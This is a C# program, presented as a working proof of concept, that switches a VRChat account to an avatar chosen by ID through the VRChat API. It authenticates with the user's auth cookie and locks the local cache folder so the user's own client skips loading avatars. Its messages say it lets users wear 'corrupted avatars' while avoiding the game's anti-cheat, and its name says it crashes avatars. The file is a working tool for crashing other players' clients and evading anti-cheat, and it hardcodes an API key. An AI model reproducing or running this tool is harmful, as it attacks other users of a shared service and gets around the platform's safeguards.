﻿//quickly thrown together as a PoC. this works, no avatar ids are included, find your own.

using System;
using System.IO;
using System.Threading;
using System.Text;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Text.RegularExpressions;
using System.Diagnostics;

namespace VRCAvatarCrasher
{
    class Software
    {
        static HttpClient web = new HttpClient(new HttpClientHandler { UseCookies = false });
        static DirectoryInfo directory = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "Low\\VRChat\\VRChat\\Cache-WindowsPlayer");

        static void LockCache(bool unlock) //confusing param, oh well
        {
            if (directory == null || !directory.Exists)
            {
                Console.WriteLine("Cache-WindowsPlayer did not exist.");
                Close(5000);
            }

            if (unlock)
            {
                FileSystemAccessRule r = new FileSystemAccessRule(Environment.UserName, FileSystemRights.FullControl, AccessControlType.Deny);
                Directory.GetAccessControl(directory.FullName).RemoveAccessRule(r);
                Directory.SetAccessControl(directory.FullName, Directory.GetAccessControl(directory.FullName));

                return;
            }

            while (true)
            {
                Process[] pname = Process.GetProcessesByName("VRChat");
                if (pname.Length != 0)
                {
                    Console.WriteLine("\nVRChat opened! Sleeping for a while then locking directory.");
                    break;
                }
                Thread.Sleep(2);
            }

            Thread.Sleep(15000); //just so everything can start up, eac is slow. adjust this to your needs

            Console.WriteLine("Attempting to lock directory to prevent avatars from loading.");

            DirectorySecurity security = Directory.GetAccessControl(directory.FullName);
            FileSystemAccessRule rule = new FileSystemAccessRule(Environment.UserName, FileSystemRights.FullControl, AccessControlType.Deny);
            security.AddAccessRule(rule);
            Directory.SetAccessControl(directory.FullName, security);

            Console.WriteLine("Locked directory. To unlock it, press ENTER on your keyboard in this Console.");

            while (true)
            {
                ConsoleKeyInfo key = Console.ReadKey(true);
                if (key.Key == ConsoleKey.Enter)
                {
                    Console.Beep();
                    Console.WriteLine("\nUnlocking directory due to key press.");
                    security.RemoveAccessRule(rule);
                    Directory.SetAccessControl(directory.FullName, security);

                    Console.WriteLine("Unlocked directory.\nPlease note that you will have to reset your avatar on the site to a normal one now.\nClosing in 10 seconds.");
                    break;
                }

                Thread.Sleep(2);
            }

            Close(10000);
        }

        static void SwapAvatar(string user_id, string auth, string avatar)
        {
            Console.WriteLine("Preparing to swap avatars onto your account.");

            if (web.BaseAddress != new Uri("https://vrchat.com/api/1/users/" + user_id + "/avatar?apiKey=JlE5Jldo5Jibnk5O5hTx6XVqsJu4WJ26"))
                web.BaseAddress = new Uri("https://vrchat.com/api/1/users/" + user_id + "/avatar?apiKey=JlE5Jldo5Jibnk5O5hTx6XVqsJu4WJ26");

            if (!web.DefaultRequestHeaders.Contains("User-Agent"))
                web.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0");

            if (web.DefaultRequestHeaders.Contains("Cookie"))
                web.DefaultRequestHeaders.Remove("Cookie");

            web.DefaultRequestHeaders.TryAddWithoutValidation("Cookie", $"auth={auth}");

            string payload = "{\"avatarId\": \"" + avatar + "\"}";
            web.PutAsync(web.BaseAddress, new StringContent(payload, Encoding.UTF8, "application/json"));

            Console.WriteLine("Swapped avatar! Please start your game now.\nRemember to revert it afterwards on the site.");

            LockCache(false);
        }

        static void Close(int ms)
        {
            Thread.Sleep(ms);
            Environment.Exit(0);
        }

        static void Main()
        {
            Console.Title = "EAC fixed it all. VRChat did the right choice. No more Avatar Crashing. Thank you VRC Engineers! svh.natt.pw";

            LockCache(true); //we can unlock it incase something went wrong

            Process[] pname = Process.GetProcessesByName("VRChat");
            if (pname.Length != 0)
            {
                Console.WriteLine("Please close VRChat before running this tool.");
                Close(5000);
            }

            Console.WriteLine("This tool will allow you to safely change into corrupted avatars and refusing assets to load, without touching EAC.");
            Console.WriteLine("Make sure VRChat is closed before using this tool\n\nNOTE: Please note that you NEED to have WORLDS DOWNLOADED as this will strip the ability\nfor you to download them when the Cache is locked.\nMake sure the avatar itself isn't cached either.\n\n");

            Thread.Sleep(2500);

            Console.Write("Do you want to hide your user id/avatar input? (y/n): ");
            string hide = Console.ReadLine();
            bool should_hide = false;
            if (hide == "y")
                should_hide = true;
            else
                should_hide = false; //who cares if they dont input "n" lol

            Console.Write("Enter Your User ID (You can grab this on VRChat.com): ");
            string user_id = null;
            if (!should_hide)
                user_id = Console.ReadLine();
            else
            {
                while (true)
                {
                    ConsoleKeyInfo key = Console.ReadKey(true);
                    if (key.Key == ConsoleKey.Enter)
                        break;
                    user_id += key.KeyChar;
                }
                user_id = Regex.Replace(user_id, @"[^\u0000-\u007F]+", string.Empty);
            }

            if (user_id.Length < 1 || !user_id.StartsWith("usr_"))
            {
                if (should_hide)
                    Console.Write("\n");
                Console.WriteLine("Please enter a valid user id.");
                Close(5000);
            }

            if (should_hide)
                Console.Write("\nEnter Your Auth Cookie (You can grab this on VRChat.com): ");
            else
                Console.Write("Enter Your Auth Cookie [HIDDEN] (You can grab this on VRChat.com): ");

            //https://stackoverflow.com/a/36332407 used for censoring authcookie input
            string auth_cookie = null;
            while (true)
            {
                ConsoleKeyInfo key = Console.ReadKey(true);
                if (key.Key == ConsoleKey.Enter)
                    break;
                auth_cookie += key.KeyChar;
            }
            auth_cookie = Regex.Replace(auth_cookie, @"[^\u0000-\u007F]+", string.Empty);

            if (auth_cookie.Length < 1 || !auth_cookie.StartsWith("authcookie_"))
            {
                Console.WriteLine("\nPlease enter a valid auth cookie.");
                Close(5000);
            }

            Console.Write("\nEnter Avatar ID to switch into: ");
            string avatar = null;
            if (!should_hide)
                avatar = Console.ReadLine();
            else
            {
                while (true)
                {
                    ConsoleKeyInfo key = Console.ReadKey(true);
                    if (key.Key == ConsoleKey.Enter)
                        break;
                    avatar += key.KeyChar;
                }
                avatar = Regex.Replace(avatar, @"[^\u0000-\u007F]+", string.Empty);
            }

            if (!avatar.StartsWith("avtr_"))
            {
                if (should_hide)
                    Console.Write("\n");
                Console.WriteLine("Please enter a valid avatar.");
                Close(5000);
            }

            if (should_hide)
                Console.Write("\n"); //so it doesnt mess up the output

            SwapAvatar(user_id, auth_cookie, avatar);
        }
    }
}
